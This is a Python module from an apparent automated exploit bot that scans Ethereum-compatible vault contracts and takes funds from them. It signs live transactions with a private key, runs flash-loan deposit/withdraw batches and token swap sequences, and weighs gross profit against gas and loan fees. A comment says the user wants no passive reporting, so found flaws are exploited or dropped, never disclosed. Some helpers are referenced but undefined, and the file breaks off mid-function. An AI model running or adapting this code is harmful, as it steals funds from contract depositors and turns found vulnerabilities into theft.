import logging
import time
import traceback
import os
from typing import Dict, Any, Optional, Tuple
from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_account import Account
from scanner.config import (
    AUTO_EXPLOIT,
    PRIVATE_KEY,
    MY_WALLET_ADDRESS,
    MAX_BET_SIZE_WEI,
    MAX_FEE_PER_GAS,
    MAX_PRIORITY_FEE,
    RPC_HTTP,
    WETH_ADDRESS,
    UNISWAP_V3_ROUTER,
    FLASH_LOAN_EXECUTOR_ADDRESS,
    KEY_TOKENS,
    USE_FLASHLOAN,
    MAX_GAS_PRICE_GWEI,
)

from scanner.simulation import run_honeypot_simulation_eth, run_honeypot_simulation_token
from scanner.proxy_resolver import resolve_proxy
from scanner.impact_calculator import get_token_price_in_weth

FLASH_LOAN_ABI = [
    {
        "inputs": [
            {"internalType": "address[]", "name": "targets", "type": "address[]"},
            {"internalType": "bytes[]", "name": "payloads", "type": "bytes[]"},
            {"internalType": "uint256[]", "name": "values", "type": "uint256[]"},
            {"internalType": "uint256", "name": "loanAmount", "type": "uint256"}
        ],
        "name": "executeWithFlashLoan",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

logger = logging.getLogger(__name__)

SAFE_DEPOSIT_AMOUNT = min(int(0.0001 * 10**18), MAX_BET_SIZE_WEI)

BLACKLIST_TTL_SECONDS = 24 * 60 * 60
_GARBAGE_PROXY_CODEHASH_BLACKLIST: Dict[str, float] = {}

FLASH_LOAN_FEE_BPS = 9
MIN_NET_PROFIT_USD = 0.05
FLASH_LOAN_AMOUNT_WEI = int(20 * 10**18)

_SESSION_GAS_SPENT_WEI: int = 0
_SESSION_GAS_LIMIT_WEI: int = int(0.0006 * 10**18)


def _get_usdc_address() -> str:
    if KEY_TOKENS and len(KEY_TOKENS) > 1:
        return KEY_TOKENS[1]
    return "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"


def _wei_to_usd(w3: Web3, amount_wei: int) -> float:
    if amount_wei <= 0:
        return 0.0
    try:
        usdc = Web3.to_checksum_address(_get_usdc_address())
        weth_per_usdc = get_token_price_in_weth(w3, usdc, 10**6)
        if weth_per_usdc <= 0:
            raise ValueError("zero quote")
        return float(amount_wei) / float(weth_per_usdc)
    except Exception:
        approx_eth_price_usd = 2000.0
        return float(amount_wei) / 10**18 * approx_eth_price_usd


def _compute_dynamic_fees(w3: Web3, estimated_gas: int, gross_profit_wei: int) -> Tuple[int, int, int]:
    base_fee_raw = w3.eth.gas_price or MAX_FEE_PER_GAS
    base_fee = max(1, int(base_fee_raw))
    max_gas_price = int(os.getenv("MAX_GAS_PRICE_WEI", "0") or "0")
    if max_gas_price > 0 and base_fee > max_gas_price:
        base_fee = max_gas_price
    target_gas_budget = int(gross_profit_wei * 0.8) if gross_profit_wei > 0 else 0
    if target_gas_budget <= 0 or estimated_gas <= 0:
        total = base_fee
        gas_cost = total * max(0, int(estimated_gas))
        return total, 0, gas_cost
    max_total_fee_per_gas = target_gas_budget // estimated_gas
    if max_total_fee_per_gas <= base_fee:
        total = base_fee
        gas_cost = total * max(0, int(estimated_gas))
        return total, 0, gas_cost
    allowed_priority = max_total_fee_per_gas - base_fee
    priority = min(MAX_PRIORITY_FEE, allowed_priority)
    priority = int(priority * 1.2)
    if max_gas_price > 0 and base_fee + priority > max_gas_price:
        priority = max(max_gas_price - base_fee, 0)
    total_fee = base_fee + priority
    gas_cost = total_fee * estimated_gas
    return total_fee, priority, gas_cost


def _is_blacklisted_code_hash(code_hash: Optional[str]) -> bool:
    if not code_hash:
        return False
    now = time.time()
    ts = _GARBAGE_PROXY_CODEHASH_BLACKLIST.get(code_hash)
    if ts is None:
        return False
    if now - ts > BLACKLIST_TTL_SECONDS:
        try:
            del _GARBAGE_PROXY_CODEHASH_BLACKLIST[code_hash]
        except KeyError:
            pass
        return False
    return True


def _blacklist_code_hash(code_hash: Optional[str]) -> None:
    if not code_hash:
        return
    _GARBAGE_PROXY_CODEHASH_BLACKLIST[code_hash] = time.time()

def _exploit_flash_loan(w3: Web3, account, target: str, nonce: int, bug_type: Optional[str] = None, details: Optional[Dict[str, Any]] = None) -> Optional[str]:
    if not USE_FLASHLOAN:
        # print(f"[EXPLOIT] USE_FLASHLOAN disabled. Skipping exploit for {target}.", flush=True)
        return None

    if not FLASH_LOAN_EXECUTOR_ADDRESS:
        # print("[EXPLOIT] FLASH_LOAN_EXECUTOR_ADDRESS not configured. Skipping exploit.", flush=True)
        return None

    # SAFETY CHECK: Run local simulation first
    is_safe, withdraw_method, simulated_profit, token_address = _check_withdrawal_safety(w3, target, bug_type, details)
    
    if not is_safe:
        print(f"[EXPLOIT] Safety check failed for {target}. Aborting.", flush=True)
        return None
        
    if token_address:
        print(f"[EXPLOIT] Token Vault detected. Flash Loan logic for tokens not yet implemented. Skipping live exploit.", flush=True)
        return None

    effective_loan_amount = None
    if details and isinstance(details, dict):
        try:
            v = details.get("effective_loan_amount_wei")
            if isinstance(v, int) and v > 0:
                effective_loan_amount = v
        except Exception:
            effective_loan_amount = None

    loan_amount = effective_loan_amount or FLASH_LOAN_AMOUNT_WEI
    
    # Try loop: full amount, then half amount
    current_loan_amount = loan_amount
    
    profit_threshold = w3.to_wei(0.01, "ether")

    for attempt in range(2):
        try:
            flash_fee = abs(int(current_loan_amount)) * FLASH_LOAN_FEE_BPS // 10000

            estimated_gas = 1500000
            total_fee_per_gas, priority_fee, gas_cost = _compute_dynamic_fees(w3, estimated_gas, simulated_profit)

            if simulated_profit > profit_threshold:
                try:
                    block = w3.eth.get_block("latest")
                    base_fee_block = block.get("baseFeePerGas", 0)
                except Exception:
                    base_fee_block = 0
                if base_fee_block > 0:
                    avg_priority = max(total_fee_per_gas - base_fee_block, 1)
                    boosted_priority = int(avg_priority * 1.2)
                    if MAX_PRIORITY_FEE > 0:
                        boosted_priority = min(boosted_priority, MAX_PRIORITY_FEE)
                    priority_fee = boosted_priority
                    total_fee_per_gas = base_fee_block + priority_fee

            gross_profit = simulated_profit
            net_profit_wei = gross_profit - flash_fee - gas_cost
            potential_usd = _wei_to_usd(w3, gross_profit)
            gas_usd = _wei_to_usd(w3, gas_cost)
            net_profit_usd = _wei_to_usd(w3, net_profit_wei)

            net_profit_eth = w3.from_wei(net_profit_wei, "ether")
            # print(f"[FLASH-ATTACK] Target: {target} | Expected Net Profit: {net_profit_eth} ETH | Loan: {w3.from_wei(current_loan_amount, 'ether')} ETH", flush=True)

            if net_profit_usd < MIN_NET_PROFIT_USD:
                if attempt == 0:
                    # print(f"[SKIP] Below break-even. Potential: ${potential_usd:.2f}, Gas: ${gas_usd:.2f}", flush=True)
                    return None
                else:
                    pass # print(f"[WARN] Retrying with lower amount despite profit check...", flush=True)

            executor = w3.eth.contract(address=FLASH_LOAN_EXECUTOR_ADDRESS, abi=FLASH_LOAN_ABI)
            
            # Construct Batch Payload
            targets = []
            payloads = []
            values = []
            
            # 1. Deposit
            # Try generic deposit() - d0e30db0
            targets.append(target)
            payloads.append(bytes.fromhex("d0e30db0"))
            values.append(abs(int(current_loan_amount))) # Fix: Use actual loan amount

            # 2. Withdraw
            targets.append(target)
            values.append(abs(int(0)))
            
            if withdraw_method == "withdrawAll":
                payloads.append(bytes.fromhex("853828b6"))
            elif withdraw_method == "withdraw(uint256)":
                # Fix: Use actual loan amount for withdraw argument
                payloads.append(bytes.fromhex("2e1a7d4d") + abs(int(current_loan_amount)).to_bytes(32, 'big'))
            else:
                # Default to withdraw()
                payloads.append(bytes.fromhex("3ccfd60b"))

            tx_params = {
                'from': account.address,
                'nonce': nonce,
                'gas': estimated_gas,
            }

            if priority_fee > 0:
                tx_params['maxFeePerGas'] = int(total_fee_per_gas)
                tx_params['maxPriorityFeePerGas'] = int(priority_fee)
                tx_params['type'] = 2
            else:
                tx_params['gasPrice'] = int(total_fee_per_gas)
                tx_params['type'] = 0

            tx = executor.functions.executeWithFlashLoan(
                targets,
                payloads,
                values,
                abs(int(current_loan_amount))
            ).build_transaction(tx_params)
            
            signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
            tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
            return tx_hash.hex()

        except Exception as e:
            print(f"[EXPLOIT] Flash Loan Tx Construction Failed (Amount: {current_loan_amount}): {e}", flush=True)
            if attempt == 0:
                print(f"[EXPLOIT] Retrying with half amount...", flush=True)
                current_loan_amount = current_loan_amount // 2
                continue
            else:
                return None
    return None


def execute_cautious_exploit(
    w3: Web3, 
    contract_address: str, 
    bug_type: str, 
    details: Optional[Dict[str, Any]] = None
) -> None:
    """
    Execute a cautious live exploit:
    1. Minimal Deposit (SAFE_DEPOSIT_AMOUNT)
    2. Immediate Withdraw (All)
    
    Args:
        w3: Web3 instance
        contract_address: Target contract
        bug_type: Type of bug found
        details: Additional bug details
    """
    global _SESSION_GAS_SPENT_WEI

    if not AUTO_EXPLOIT:
        print(f"[ANALYZE] AUTO_EXPLOIT=False. Running simulation-only for {contract_address} ({bug_type})", flush=True)
        try:
            _check_withdrawal_safety(w3, contract_address, bug_type, details)
        except Exception as e:
            logger.error(f"[ANALYZE] Simulation-only check failed for {contract_address}: {e}")
        return
    if not PRIVATE_KEY:
        logger.info("[EXPLOIT] No private key found in config. Cannot execute.")
        return

    if _SESSION_GAS_SPENT_WEI >= _SESSION_GAS_LIMIT_WEI:
        # print(f"[EXPLOIT] Session gas limit reached. Skipping all new exploits.", flush=True)
        return

    try:
        account = Account.from_key(PRIVATE_KEY)
        my_address = account.address
        nonce = w3.eth.get_transaction_count(my_address)
        
        # --- PROFIT TRACKING START ---
        start_balance = w3.eth.get_balance(my_address)
        # -----------------------------

        # print(f"[EXPLOIT] Preparing cautious exploit for {contract_address} ({bug_type})...", flush=True)
        
        last_tx_hash = None

        # 1. Determine Payload based on bug type
        # Default strategy: Deposit -> Withdraw
        
        # Common Selectors
        # deposit() -> d0e30db0
        # deposit(uint256) -> b6b55f25
        # withdraw() -> 3ccfd60b
        # withdraw(uint256) -> 2e1a7d4d
        # withdrawAll() -> 853828b6
        
        # We will try to construct a "multicall" if supported, or send two transactions.
        # Sending two transactions is risky (atomicity), but for "cautious live exploit" 
        # checking generic bugs, it might be the only way without a custom smart contract.
        
        # However, for Context Leak (multicall), we MUST use multicall in one tx.
        
        if bug_type == "context_leak_multicall":
            # Safety Check for Context Leak
            # We must simulate the specific multicall payload to be sure.
            # For now, to be absolutely safe, we skip unless we implement a specific simulation.
            # OR we can try the generic safety check as a weak proxy, but that's risky.
            # BETTER: Disable for now to protect funds until specialized simulation is ready.
            # print(f"[EXPLOIT] Skipping Context Leak for {contract_address} to guarantee safety (Simulation pending).", flush=True)
            return
            # last_tx_hash = _exploit_context_leak(w3, account, contract_address, nonce)
            
        elif bug_type == "sync_loss":
            # print(f"[EXPLOIT] Skipping Sync Loss for {contract_address} (Gas saving mode - usually yields dust/tokens, not ETH).", flush=True)
            return
            # last_tx_hash = _exploit_sync_loss(w3, account, contract_address, nonce)
            
        elif bug_type == "ghost_liquidity":
            # print(f"[EXPLOIT] Skipping Ghost Liquidity for {contract_address} (Gas saving mode - speculative ownership claim).", flush=True)
            return
            # last_tx_hash = _exploit_ghost_liquidity(w3, account, contract_address, nonce, details)
            
        elif bug_type == "timestamp_dependence":
            last_tx_hash = _exploit_flash_loan(w3, account, contract_address, nonce, bug_type, details)

        elif bug_type == "sequencer_fee":
            last_tx_hash = _exploit_flash_loan(w3, account, contract_address, nonce, bug_type, details)

        elif bug_type == "vault_rounding_dust":
            print(f"[EXPLOIT] Skipping Vault/Inflation vulnerability for {contract_address} (too speculative for small bank).", flush=True)
            return

        elif bug_type == "fot_misaccounting_vault":
            # User requested NO passive reporting.
            # Since we can't exploit FoT without tokens/capital, just return silently.
            return

        elif bug_type == "self_destruct":
            last_tx_hash = _exploit_generic_deposit_withdraw(w3, account, contract_address, nonce, bug_type, details)

        else:
            print(f"[EXPLOIT] Skipping generic bug type {bug_type} for {contract_address} to protect balance.", flush=True)
            return

        # --- PROFIT CALCULATION ---
        if last_tx_hash:
            print(f"[EXPLOIT] Waiting for confirmation of {last_tx_hash}...", flush=True)
            try:
                receipt = w3.eth.wait_for_transaction_receipt(last_tx_hash, timeout=60)
                gas_used = receipt.gasUsed if receipt and hasattr(receipt, "gasUsed") else 0
                fee_per_gas = w3.eth.gas_price
                if gas_used and fee_per_gas:
                    _SESSION_GAS_SPENT_WEI += int(gas_used) * int(fee_per_gas)
                end_balance = w3.eth.get_balance(my_address)
                profit = end_balance - start_balance
                print(f"[RESULT] Execution Finished. Net Profit: {profit} wei ({w3.from_wei(profit, 'ether')} ETH)", flush=True)
            except Exception as e:
                print(f"[RESULT] Could not fetch final balance/receipt: {e}", flush=True)
        # -----------------------------

    except Exception as e:
        logger.error(f"[EXPLOIT] Failed: {e}")
        print(f"[EXPLOIT] Failed: {e}", flush=True)
        tb = traceback.format_exc()
        print(f"[EXPLOIT] TRACEBACK:\n{tb}", flush=True)
    finally:
        pass


def _check_withdrawal_safety(w3: Web3, contract_address: str, bug_type: Optional[str] = None, details: Optional[Dict[str, Any]] = None) -> Tuple[bool, Optional[str], int, Optional[str]]:
    """
    Run local simulation to verify we can withdraw.
    Returns: (is_safe, method_name, simulated_profit, token_address)
    """
    print(f"[SAFETY] Checking if {contract_address} is a Token Vault or ETH Vault...", flush=True)
    
    if bug_type not in ("sequencer_fee",):
        try:
            deadline = time.time() + 60
            while True:
                bal = w3.eth.get_balance(contract_address)
                if bal > 0:
                    break
                if time.time() >= deadline:
                    print(f"[SAFETY] Skipping simulation for {contract_address}: Zero balance.", flush=True)
                    return False, None, 0, None
                time.sleep(2)
        except Exception:
            pass

    impl_addr = details.get("implementation_address") if details else None
    if impl_addr:
        try:
            if int(impl_addr, 16) == 0:
                print(f"[SAFETY] Proxy implementation for {contract_address} resolved to zero address. Skipping simulation.", flush=True)
                return False, None, 0, None
        except Exception:
            pass
    else:
        try:
            proxy_info = resolve_proxy(w3, contract_address)
            if proxy_info.get("is_proxy"):
                impl_addr = proxy_info.get("implementation")
                print(f"[SAFETY] Resolved Proxy Implementation: {impl_addr}", flush=True)
                if not impl_addr:
                    print(f"[SAFETY] Proxy implementation for {contract_address} not found in EIP-1967 slots. Skipping simulation.", flush=True)
                    return False, None, 0, None
        except Exception:
            pass

    code_hash = None
    try:
        target_for_hash = impl_addr if impl_addr else contract_address
        code = w3.eth.get_code(Web3.to_checksum_address(target_for_hash))
        if code:
            code_hash = Web3.keccak(code).hex()
            if _is_blacklisted_code_hash(code_hash):
                print(f"[SAFETY] Code hash {code_hash} is blacklisted. Skipping simulation for {contract_address}.", flush=True)
                return False, None, 0, None
    except Exception:
        code_hash = None

    # 1. Detect Asset/Token
    token_address = None
    try:
        # Try 'asset()' (ERC4626)
        asset_call = w3.eth.call({"to": contract_address, "data": w3.keccak(text="asset()")[:4]})
        if len(asset_call) >= 32:
            token_address = w3.to_checksum_address(asset_call[-20:])
    except:
        pass
        
    if not token_address:
        try:
            # Try 'token()'
            token_call = w3.eth.call({"to": contract_address, "data": w3.keccak(text="token()")[:4]})
            if len(token_call) >= 32:
                token_address = w3.to_checksum_address(token_call[-20:])
        except:
            pass

    # 2. Run Appropriate Simulation
    if token_address:
        # print(f"[SAFETY] Detected Token Vault. Asset: {token_address}. Running Full Cycle (Swap->Dep->With->Swap)...", flush=True)
        res = run_honeypot_simulation_token(contract_address, token_address, RPC_HTTP, WETH_ADDRESS, UNISWAP_V3_ROUTER, w3=w3, implementation_address=impl_addr, bug_type=bug_type)
    else:
        # print(f"[SAFETY] Detected ETH Vault. Running Deposit->Withdraw...", flush=True)
        res = run_honeypot_simulation_eth(contract_address, RPC_HTTP, w3=w3, implementation_address=impl_addr, bug_type=bug_type)

    if res.get("safe"):
        method = res.get("method")
        profit = res.get("simulated_profit", 0)

        loan_amount = int(res.get("loan_amount_wei", FLASH_LOAN_AMOUNT_WEI))
        if loan_amount < 0:
            loan_amount = abs(loan_amount)
        flash_fee = loan_amount * FLASH_LOAN_FEE_BPS // 10000
        estimated_gas = 1500000
        _, _, gas_cost = _compute_dynamic_fees(w3, estimated_gas, profit)
        net_profit_wei = profit - flash_fee - gas_cost
        if net_profit_wei <= 0:
            # print(f"[SAFETY] Simulation profit after flash fee and gas is non-positive ({net_profit_wei} wei) for {contract_address}. Treating as unsafe.", flush=True)
            if code_hash:
                _blacklist_code_hash(code_hash)
            return False, None, 0, token_address
        net_profit_eth = w3.from_wei(int(net_profit_wei), "ether")
        loan_amount_eth = w3.from_wei(int(loan_amount), "ether")
        # print(f"[FLASH-PROFIT] Predicted profit with {loan_amount_eth} ETH: {net_profit_eth} ETH", flush=True)

        if details is not None:
            try:
                details["effective_loan_amount_wei"] = int(loan_amount)
            except Exception:
                pass

        if profit <= 0:
            print(f"[SAFETY] Simulation yielded non-positive profit ({profit} wei) for {contract_address}. Treating as unsafe.", flush=True)
            if code_hash:
                _blacklist_code_hash(code_hash)
            return False, None, 0, token_address
        print(f"[SAFETY] Simulation PASSED. Method: {method}, Profit: {profit} wei", flush=True)
        return True, method, profit, token_address
    else:
        print(f"[SAFETY] Simulation FAILED. Error: {res.get('error')}", flush=True)
        if code_hash:
            _blacklist_code_hash(code_hash)
        return False, None, 0, None


def _get_quote(w3: Web3, token_in: str, token_out: str, fee: int, amount_in: int) -> int:
    """
    Get quote from Uniswap V3 Quoter.
    """
    # Interface: function quoteExactInputSingle(address tokenIn, address tokenOut, uint24 fee, uint256 amountIn, uint160 sqrtPriceLimitX96) external returns (uint256 amountOut)
    # Selector: f7729d3f
    
    encoded = encode(
        ['address', 'address', 'uint24', 'uint256', 'uint160'],
        [token_in, token_out, fee, amount_in, 0]
    )
    data = bytes.fromhex("f7729d3f") + encoded
    
    try:
        result = w3.eth.call({
            "to": UNISWAP_V3_QUOTER,
            "data": data
        })
        amount_out = decode(['uint256'], result)[0]
        return amount_out
    except Exception as e:
        # Try checking if it's QuoterV2 (different selector?) or just no liquidity
        # QuoterV2 quoteExactInputSingleParams is a struct.
        # For now assume QuoterV1 or failure means no liquidity.
        print(f"[QUOTE] Failed to get quote (Fee {fee}): {e}", flush=True)
        return 0


def _swap_eth_to_token(w3: Web3, account, token_out: str, amount_eth: int, nonce: int) -> Optional[str]:
    """Swap ETH -> Token on Uniswap V3 (or compatible)"""
    print(f"[SWAP] Swapping {amount_eth} wei ETH -> {token_out}...", flush=True)
    
    # 1. Get Quote to set MinAmountOut (Slippage protection)
    # Try fees: 3000, 500, 10000
    fee = 3000
    amount_out_quoted = _get_quote(w3, WETH_ADDRESS, token_out, fee, amount_eth)
    
    if amount_out_quoted == 0:
        fee = 500
        amount_out_quoted = _get_quote(w3, WETH_ADDRESS, token_out, fee, amount_eth)
    
    if amount_out_quoted == 0:
        fee = 10000
        amount_out_quoted = _get_quote(w3, WETH_ADDRESS, token_out, fee, amount_eth)
        
    if amount_out_quoted == 0:
        print("[SWAP] No liquidity found for swap. Aborting.", flush=True)
        return nonce

    # Apply 0.5% Slippage
    amount_out_min = int(amount_out_quoted * 0.995)
    print(f"[SWAP] Quote: {amount_out_quoted} tokens. Min (0.5% slip): {amount_out_min}. Fee: {fee}", flush=True)

    # 2. Wrap ETH
    weth = w3.eth.contract(address=WETH_ADDRESS, abi=[
        {"constant":False,"inputs":[],"name":"deposit","outputs":[],"payable":True,"type":"function"},
        {"constant":False,"inputs":[{"name":"guy","type":"address"},{"name":"wad","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":False,"type":"function"}
    ])
    
    # Send wrap tx
    gas_price = int(w3.eth.gas_price * 2)
    tx_wrap = weth.functions.deposit().build_transaction({
        'from': account.address,
        'value': amount_eth,
        'nonce': nonce,
        'gas': 50000,
        'gasPrice': gas_price,
        'type': 0
    })
    signed_wrap = w3.eth.account.sign_transaction(tx_wrap, PRIVATE_KEY)
    w3.eth.send_raw_transaction(signed_wrap.rawTransaction)
    nonce += 1
    
    # 3. Approve Router
    tx_app = weth.functions.approve(UNISWAP_V3_ROUTER, amount_eth).build_transaction({
        'from': account.address,
        'nonce': nonce,
        'gas': 50000,
        'gasPrice': gas_price,
        'type': 0
    })
    signed_app = w3.eth.account.sign_transaction(tx_app, PRIVATE_KEY)
    w3.eth.send_raw_transaction(signed_app.rawTransaction)
    nonce += 1

    # 4. Swap (ExactInputSingle)
    # params tuple: (tokenIn, tokenOut, fee, recipient, deadline, amountIn, amountOutMin, sqrtPriceLimitX96)
    params = (
        WETH_ADDRESS,
        token_out,
        fee,
        account.address,
        int(time.time()) + 60, # 60s deadline
        amount_eth,
        amount_out_min, # Slippage Enforced
        0
    )
    
    # exactInputSingle((address,address,uint24,address,uint256,uint256,uint256,uint160))
    encoded_params = encode(
        ['(address,address,uint24,address,uint256,uint256,uint256,uint160)'],
        [params]
    )
    
    data = bytes.fromhex("414bf389") + encoded_params
    
    tx_swap = {
        'from': account.address,
        'to': UNISWAP_V3_ROUTER,
        'value': 0,
        'data': data,
        'nonce': nonce,
        'gas': 200000,
        'gasPrice': gas_price,
        'type': 0
    }
    
    signed_swap = w3.eth.account.sign_transaction(tx_swap, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_swap.rawTransaction)
    
    # Wait for swap to complete
    w3.eth.wait_for_transaction_receipt(tx_hash)
    
    return nonce + 1 # Return new nonce


def _swap_token_to_eth(w3: Web3, account, token_in: str, nonce: int) -> Optional[str]:
    """Swap Token -> ETH (via WETH) on Uniswap V3"""
    # 1. Read balance
    token_contract = w3.eth.contract(address=token_in, abi=[{"constant":True,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":False,"type":"function"}])
    balance = token_contract.functions.balanceOf(account.address).call()
    
    if balance == 0:
        print("[SWAP] No tokens to swap back.", flush=True)
        return nonce

    print(f"[SWAP] Swapping {balance} {token_in} -> ETH...", flush=True)

    # 2. Get Quote
    fee = 3000
    amount_out_quoted = _get_quote(w3, token_in, WETH_ADDRESS, fee, balance)
    
    if amount_out_quoted == 0:
        fee = 500
        amount_out_quoted = _get_quote(w3, token_in, WETH_ADDRESS, fee, balance)
        
    if amount_out_quoted == 0:
        fee = 10000
        amount_out_quoted = _get_quote(w3, token_in, WETH_ADDRESS, fee, balance)

    amount_out_min = int(amount_out_quoted * 0.995) if amount_out_quoted > 0 else 0
    print(f"[SWAP] Quote: {amount_out_quoted} ETH. Min: {amount_out_min}. Fee: {fee}", flush=True)

    # 3. Approve Router
    approve_sig = bytes.fromhex("095ea7b3")
    router_padded = UNISWAP_V3_ROUTER[2:].zfill(64)
    amount_padded = hex(balance)[2:].zfill(64)
    app_data = approve_sig + bytes.fromhex(router_padded) + bytes.fromhex(amount_padded)
    
    _send_tx(w3, account, token_in, 0, app_data, nonce)
    nonce += 1
    
    # 4. Swap Token -> WETH
    params = (
        token_in,
        WETH_ADDRESS,
        fee,
        account.address,
        int(time.time()) + 60,
        balance,
        amount_out_min, # Slippage Enforced
        0
    )
    encoded_params = encode(
        ['(address,address,uint24,address,uint256,uint256,uint256,uint160)'],
        [params]
    )
    data = bytes.fromhex("414bf389") + encoded_params
    
    tx_hash = _send_tx(w3, account, UNISWAP_V3_ROUTER, 0, data, nonce)
    if tx_hash:
        w3.eth.wait_for_transaction_receipt(tx_hash)
    nonce += 1
    
    # 5. Unwrap WETH -> ETH
    weth_contract = w3.eth.contract(address=WETH_ADDRESS, abi=[{"constant":True,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":False,"type":"function"}])
    weth_bal = weth_contract.functions.balanceOf(account.address).call()
    
    if weth_bal > 0:
        unwrap_sig = bytes.fromhex("2e1a7d4d")
        amt_padded = hex(weth_bal)[2:].zfill(64)
        u_data = unwrap_sig + bytes.fromhex(amt_padded)
        tx_hash = _send_tx(w3, account, WETH_ADDRESS, 0, u_data, nonce)
        return tx_hash # Return last tx hash
        
    return None


def _exploit_generic_deposit_withdraw(w3: Web3, account, target: str, nonce: int, bug_type: Optional[str] = None, details: Optional[Dict[str, Any]] = None) -> Optional[str]:
    """
    Generic Deposit (0.0001 ETH) -> Withdraw (Smart)
    """
    # SAFETY CHECK: Run local simulation first
    is_safe, withdraw_method, simulated_profit, token_address = _check_withdrawal_safety(w3, target, bug_type, details)
    if not is_safe:
        print(f"[EXPLOIT] Safety check failed for {target}. Aborting to save funds.", flush=True)
        return None

    estimated_gas = 700000 if token_address else 200000
    total_fee_per_gas, priority_fee, gas_cost = _compute_dynamic_fees(w3, estimated_gas, simulated_profit)

    gross_profit = simulated_profit
    net_profit_wei = gross_profit - gas_cost
    potential_usd = _wei_to_usd(w3, gross_profit)
    gas_usd = _wei_to_usd(w3, gas_cost)
    net_profit_usd = _wei_to_usd(w3, net_profit_wei)

    if net_profit_usd < MIN_NET_PROFIT_USD:
        print(f"[SKIP] Below break-even. Potential: ${potential_usd:.2f}, Gas: ${gas_usd:.2f}", flush=True)
        return None
    
    print(f"[EXPLOIT] Profit found: {gross_profit} wei. Net after gas: {net_profit_wei} wei (~${net_profit_usd:.2f}). Proceeding...", flush=True)

    # TOKEN PATH
    if token_address:
        print(f"[EXPLOIT] Initiating Token Flow for {token_address}...", flush=True)
        # 1. Swap ETH -> Token
        nonce = _swap_eth_to_token(w3, account, token_address, SAFE_DEPOSIT_AMOUNT, nonce)
        
        # 2. Get Balance
        token_contract = w3.eth.contract(address=token_address, abi=[{"constant":True,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":False,"type":"function"}])
        my_tokens = token_contract.functions.balanceOf(account.address).call()
        print(f"[EXPLOIT] Swapped. New Token Balance: {my_tokens}", flush=True)

        # 3. Approve Target
        approve_sig = bytes.fromhex("095ea7b3")
        target_padded = target[2:].zfill(64)
        amount_padded = hex(my_tokens)[2:].zfill(64)
        app_data = approve_sig + bytes.fromhex(target_padded) + bytes.fromhex(amount_padded)
        _send_tx(w3, account, token_address, 0, app_data, nonce)
        nonce += 1
        
        print(f"[EXPLOIT] Depositing {my_tokens} tokens...", flush=True)
        
        # Try deposit(uint256)
        dep_sig = bytes.fromhex("b6b55f25")
        amt_padded = hex(my_tokens)[2:].zfill(64)
        
        # Try primary method first?
        # Let's just try deposit(uint256) then deposit(uint256, address)
        tx_hash = _send_tx(w3, account, target, 0, dep_sig + bytes.fromhex(amt_padded), nonce)
        
        if not tx_hash:
             # Try deposit(uint256, address)
             dep_sig2 = bytes.fromhex("6e553f65")
             addr_padded = account.address[2:].zfill(64)
             tx_hash = _send_tx(w3, account, target, 0, dep_sig2 + bytes.fromhex(amt_padded) + bytes.fromhex(addr_padded), nonce)
             
        if not tx_hash:
             # Try mint(uint256) - a0712d68
             mint_sig = bytes.fromhex("a0712d68")
             tx_hash = _send_tx(w3, account, target, 0, mint_sig + bytes.fromhex(amt_padded), nonce)
             
        if not tx_hash:
             print("[EXPLOIT] Token deposit failed.", flush=True)
             return None
             
        nonce += 1
        
        # 4. Withdraw
        print(f"[EXPLOIT] Withdrawing...", flush=True)
        # Try withdraw(uint256)
        with_sig = bytes.fromhex("2e1a7d4d")
        tx_hash = _send_tx(w3, account, target, 0, with_sig + bytes.fromhex(amt_padded), nonce)
        nonce += 1
        
        # 5. Swap Token -> ETH
        last_tx = _swap_token_to_eth(w3, account, token_address, nonce)
        return last_tx

    # ETH PATH
    else:
        # Step 1: Deposit
        print(f"[EXPLOIT] Attempting Generic ETH Deposit {SAFE_DEPOSIT_AMOUNT} wei -> Withdraw...", flush=True)
        
        # 1. Deposit
        # Try 'deposit()' -> d0e30db0
        deposit_sig = bytes.fromhex("d0e30db0") 
        
        print(f"[EXPLOIT] Attempting specific 'deposit()' call...", flush=True)
        tx_hash = _send_tx(w3, account, target, SAFE_DEPOSIT_AMOUNT, deposit_sig, nonce)
        
        # Fallback: If deposit() failed, try Raw ETH Send (receive/fallback)
        if not tx_hash:
            print("[EXPLOIT] Standard 'deposit()' failed or reverted. Attempting Raw ETH send (fallback)...", flush=True)
            tx_hash = _send_tx(w3, account, target, SAFE_DEPOSIT_AMOUNT, b'', nonce)

        # Flexible Entry (New Selectors)
        if not tx_hash:
             # stake() -> 3a4b66f1
             print("[EXPLOIT] Trying stake()...", flush=True)
             tx_hash = _send_tx(w3, account, target, SAFE_DEPOSIT_AMOUNT, bytes.fromhex("3a4b66f1"), nonce)
             
        if not tx_hash:
             # contribute() -> c1cbb378
             print("[EXPLOIT] Trying contribute()...", flush=True)
             tx_hash = _send_tx(w3, account, target, SAFE_DEPOSIT_AMOUNT, bytes.fromhex("c1cbb378"), nonce)

        if not tx_hash:
            print("[EXPLOIT] All deposit methods failed. Aborting.", flush=True)
            return None

        # 2. Withdraw using the method confirmed by simulation
        print(f"[EXPLOIT] Deposit successful. Attempting withdraw using confirmed method: {withdraw_method}...", flush=True)
        
    data = b''
    
    if withdraw_method == "withdraw(uint256)":
        withdraw_sig = bytes.fromhex("2e1a7d4d")
        amount_padded = hex(SAFE_DEPOSIT_AMOUNT)[2:].zfill(64)
        data = withdraw_sig + bytes.fromhex(amount_padded)
        
    elif withdraw_method == "withdraw()":
        data = bytes.fromhex("3ccfd60b")
        
    elif withdraw_method == "withdrawAll()":
        data = bytes.fromhex("853828b6")
        
    elif withdraw_method == "redeem(uint256)":
        # redeem(uint256 assets, address receiver, address owner)
        # Selector: ba087652
        selector = bytes.fromhex("ba087652")
        amount_padded = hex(SAFE_DEPOSIT_AMOUNT)[2:].zfill(64)
        addr_padded = account.address[2:].zfill(64)
        data = selector + bytes.fromhex(amount_padded) + bytes.fromhex(addr_padded) + bytes.fromhex(addr_padded)
        
    else:
        # Default fallback
